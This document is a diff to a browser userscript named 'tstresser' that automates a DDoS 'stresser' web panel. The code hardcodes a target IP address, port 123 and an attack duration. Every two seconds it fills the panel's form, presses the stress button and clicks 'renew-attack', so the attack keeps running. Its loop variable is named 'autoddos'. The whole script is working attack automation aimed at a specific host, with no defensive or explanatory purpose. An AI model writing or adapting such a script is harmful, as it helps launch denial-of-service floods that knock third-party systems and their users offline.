@@ -1,7 +1,7 @@
 // ==UserScript==
-// @name         New Userscript
+// @name         tstresser
 // @namespace    http://tampermonkey.net/
-// @version      2024-08-18
+// @version      3.01
 // @description  try to take over the world!
 // @author       You
 // @match        http*://*/*
@@ -9,6 +9,21 @@
 // @grant        none
 // ==/UserScript==
 
+
+var iptarget1="103.222.255.36";
+var porttarget1="123";
+var waktu1="60";
+var methode1="0"
+
 var autoddos = setInterval(function (){
-  document.getElementsByClassName("btn btn-alt-success renew-attack")[0].click()
+    document.getElementById("input01").value = iptarget1
+    document.getElementById("input02").value = porttarget1
+    document.getElementById("input03").value = waktu1
+    document.getElementById("stressBtn").click()
+
+    document.getElementsByClassName("btn btn-alt-success renew-attack")[0].click()
 },2000)
+
+window.setTimeout( function() {
+    document.location.href=document.location.origin + "/panel.php"
+}, 20000);
